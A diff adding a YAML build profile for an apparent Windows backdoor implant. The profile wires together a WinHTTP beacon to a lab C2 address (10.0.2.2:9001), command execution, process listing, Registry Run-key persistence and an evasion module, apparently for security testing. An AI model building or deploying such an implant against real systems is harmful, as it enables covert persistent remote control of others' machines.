@@ -1,0 +1,26 @@
+name: backdoor_http_test
+description: WinHTTP backdoor — minimal evasion for CS testing (no anti_sandbox/triggered_exec)
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+c2: c2/winhttp_beacon
+
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+
+arch: arch/backdoor
+persist: persist/registry_run
+
+resources: true
+
+evasion:
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  BEACON_INTERVAL_MS: "10000"
